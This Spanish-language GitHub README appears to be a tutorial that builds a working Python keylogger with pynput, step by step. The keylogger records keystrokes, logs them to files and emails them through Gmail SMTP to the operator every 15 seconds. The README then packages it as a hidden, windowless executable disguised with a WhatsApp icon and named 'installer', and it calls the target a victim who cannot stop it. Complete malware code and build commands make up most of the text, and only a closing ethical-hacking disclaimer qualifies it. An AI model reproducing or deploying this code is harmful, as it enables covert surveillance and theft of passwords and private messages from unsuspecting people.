# --> TARGET --->> PARROT OS 


* Requerimientos : Instalar pynput

```bash
pip install pynput
``` 
# Importante: reinicia tu editor de codigo despues de instalar pynput.

#  HackMode > ON!

```bash
from pynput.keyboard import Listener

def capturar_teclas(key):
    print(key)
    
with Listener(on_press=capturar_teclas) as l:
    l.join()
```   

![EMPEZAMOS A CAPTURAR](https://user-images.githubusercontent.com/97669969/159133261-b7100e64-e532-4f0b-a776-ee9ca6c859ae.png)
* Empezamos a capturar las teclas de nuestra target.



# Guardamos todo en un documento '.txt'.

```bash

from pynput.keyboard import Listener
import datetime

d = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

file = open('keylogger-{}.txt'.format(d),'w')

        
def capturar_teclas(key):
    
    key = str(key)
    if key == 'Key.enter':
        file.write("\n")
    elif key == 'Key.space':
        file.write(" ")
    elif key == 'Key.backspace':
        file.write('%BORRAR%')
    else:
        file.write(key.replace("'",""))
    print(key)

with Listener(on_press=capturar_teclas) as l:
    l.join()
```

![guradar txt](https://user-images.githubusercontent.com/97669969/159135961-8b358780-7b10-44d7-b568-703aa8a0b0d6.png)
* El documento .txt esta creado, incluso implementamos un segundo .txt con fechas y hora , diario.

# Envio de correo con Gmail.com 
# HackMode TIP! : a partir de 30 de mayo del 2022 gmail bloquea todas las apps noseguras.
* PARA ESO : en tu cuenta de google debes Permitir el acceso de aplicaciones menos seguras: en 'SÍ'

![gmail no seguras](https://user-images.githubusercontent.com/97669969/159137846-683e2398-b806-4292-86c6-d71bc174b67d.png)


```bash
from http import server
import smtplib

mensaje = "Subject:Correo desde Target1 \nHola desde email.py"

server_smtp = smtplib.SMTP("smtp.gmail.com",587)

server_smtp.starttls()

server_smtp.login("deniseduranbybit@gmail.com","password")

server_smtp.sendmail("deniseduranbybit@gmail.com","deniseduranbybit@gmail.com", mensaje)

server_smtp.quit()

print("Correo enviando correctamente")
```

![envio de correo parrot](https://user-images.githubusercontent.com/97669969/159138025-d4a906b7-e5dd-4f8b-af83-08a57512966b.png)
* El correo usado es un nombre al azar, usado como exemplo)


* Recibimos el correo desde nuestras !Targets!

![corre envio ubuntu](https://user-images.githubusercontent.com/97669969/159137793-d7097c7b-a3ce-4455-8231-265b10f91d10.png)

 
 # Desarollo de Keylogger: Implementamos > Metodos Clases Funciones (Preparamiento)
 
 ```bash
 import pynput
import threading
import smtplib

log = ""

class Keylogger:

    def __init__(self,intervalo,email,password):
        pass

    def append_to_log(self,string):
        pass

    def capturar_teclas(self,key):
        pass

    def reporte(self):
        pass

    def enviar_email(self,email,password.mensaje):
        pass

    def start(self):
        pass
        
 ```
 
 ![preparamiento](https://user-images.githubusercontent.com/97669969/159140917-d0484042-b22b-4369-a8d3-d45bf05e111f.png)
 
 
 # Desarollo de Keylogger: Implementamos append, teclas, reporte.
 
 ```bash
 import pynput
import threading
import smtplib

log = ""

class Keylogger:

    def __init__(self,intervalo,email,password):
        self.log = "Keylogger iniciado!"
        self.intervalo = intervalo
        self.email = email
        self.password = password

    def append_to_log(self,string):
        self.log = self.log + string


    def capturar_teclas(self,key):
        try:
           current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)


    def reporte(self):
        pass

    def enviar_email(self,email,password.mensaje):
        pass

    def start(self):
        pass
   ```
   
   ![apppend to log](https://user-images.githubusercontent.com/97669969/159141116-0f22b852-6856-493d-b938-0ecd0614003b.png)


# Desarollo de Keylogger: Implementamos email, reporte.

```bash
import pynput
import threading
import smtplib

log = ""

class Keylogger:

    def __init__(self,intervalo,email,password):
        self.log = "Keylogger iniciado!"
        self.intervalo = intervalo
        self.email = email
        self.password = password

    def append_to_log(self,string):
        self.log = self.log + string


    def capturar_teclas(self,key):
        try:
           current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)


    def reporte(self):
        self.enviar_email(self.email,self.password,"\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.intervalo,self.reporte)
        timer.start()
        

    def enviar_email(self,email,password,mensaje):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,mensaje)
        server.quit()


    def start(self):
        pass
        
  ```
  
  ![email y reporte](https://user-images.githubusercontent.com/97669969/159141346-0e677959-35bf-458d-bb46-f5a0cce14d4c.png)

# Retoque Final; Keylogger en Action!

```bash
import pynput
import threading
import smtplib

from pynput import keyboard

log = ""

class Keylogger:

    def __init__(self,intervalo,email,password):
        self.log = "Keylogger iniciado!"
        self.intervalo = intervalo
        self.email = email
        self.password = password

    def append_to_log(self,string):
        self.log = self.log + string


    def capturar_teclas(self,key):
        try:
           current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)


    def reporte(self):
        self.enviar_email(self.email,self.password,"\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.intervalo,self.reporte)
        timer.start()
        

    def enviar_email(self,email,password,mensaje):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,mensaje)
        server.quit()


    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.capturar_teclas)
        with keyboard_listener:
            self.reporte()
            keyboard_listener.join()
            
  ```
  
  ![keylogger en ACTION](https://user-images.githubusercontent.com/97669969/159141792-feda659f-e90b-471a-8f12-1ffa8f9c92aa.png)
  

# Creamos un log.py que es nuestro (Listener) nuestro audifono! (el keylogger se encuentra corriendo en nuestro !Target!

```bash
import Keylogger as KG

log = KG.Keylogger(15,"deniseduranbybit@gmail.com","password")
log.start()

```
* 15 : son segundos ( cada 15 segundos recibimos la captura de las teclas,)

![kg](https://user-images.githubusercontent.com/97669969/159141911-a7da8599-7621-4ace-9636-1db86c3b8ca6.png)
* Corriendo!

# Correos llegando cada 15 sec

![iniciado](https://user-images.githubusercontent.com/97669969/159141961-7800edcf-c98b-428b-9ff2-8f55340ddda7.png)

![hola como estas](https://user-images.githubusercontent.com/97669969/159141978-b32ffbfb-074d-4cc9-b086-d57356cc9391.png)
![vacio](https://user-images.githubusercontent.com/97669969/159141980-8d02df4a-1617-4e6b-a497-cb11bb7213c6.png)

*  Si lo seteamos a 15 seg cada 15 seg recibimos el email.
# IMPORTANTE: El keylogger lo paramos mediante CTRL+C en el terminal nuestro, pero en la maquina dela victima por ex: NO SE PUEDE PARAR!

# Keylogger '.exe


```bash
* pip install pynput (Importante: necesitamos pynput 1.6.8)
```

* Comprueba tu version:

```bash
pip freeze
```

* Instalar 1.6.8

```bash
pip install pynput==1.6.8
```

# Tambien se necesita pyinstaller
```bash
pip install pyinstaller
```


# Creamos el ejecutable .Exe

```bash
pyinstaller --onefile -windowed --noconsole -i=whatsapp.ico log.py --name installer
```

* En el anterior repo mio (Backdoor Laboratorio) > explico en detalle cada uno de los comandos:
* https://github.com/tmcyberagent/BACKDOOR-LABORATORIO-

![adm de tareas](https://user-images.githubusercontent.com/97669969/159286830-b26c4e84-0cb5-497f-bf9b-600d48582681.png)


![Captura de pantalla de 2022-03-21 15-24-00](https://user-images.githubusercontent.com/97669969/159286841-07d0c514-bb80-47b9-b84b-2d9957d02909.png)

![corre envio ubuntu](https://user-images.githubusercontent.com/97669969/159286886-da1ced18-a7ca-4e56-8659-d1df7324ffa2.png)


![Captura de pantalla de 2022-03-21 15-24-22](https://user-images.githubusercontent.com/97669969/159286894-32b6a976-b53e-4f5c-a991-e8187e89d80a.png)


![Captura de pantalla de 2022-03-21 15-24-33](https://user-images.githubusercontent.com/97669969/159286904-3980fb6a-7295-4a24-86ea-d1988a699d29.png)









# "TMCyber offers its information on the Internet basically for the benefit of people interested in the efforts and in favor of the implementation of the protection and promotion of computer security (Cybersecurity) and Ethical Hacking.""
TMCyber is not responsible for the misuse of this tool.

### If this project help you reduce time to develop, you can give me a cup of coffee :)


[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/E1E1EBFQ3)



<a href="https://www.buymeacoffee.com/tonymerisan" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
